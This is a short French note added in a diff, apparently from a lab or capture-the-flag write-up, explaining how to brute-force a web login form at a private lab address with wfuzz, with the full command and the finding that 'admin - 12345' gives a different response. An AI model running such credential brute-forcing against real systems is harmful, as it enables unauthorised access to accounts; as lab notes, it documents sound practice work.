@@ -1,0 +1,8 @@
+J'ai utilisé WFUZZ pour brute forcer le login/password
+
+-> Faire un fichier users.txt avec la liste des users potentiels
+-> Faire un fichier pass.txt avec la liste des password potentiels
+-> wfuzz -u http://10.10.24.1/login -X POST -w users.txt -w passwords.txt -d "username=FUZZ&password=FUZ2Z"
+
+
+On voit qu'a la ligne avec la tentative 'admin - 12345' la réponse est différente (Y a des chances que ce soit ce que l'on cherche)
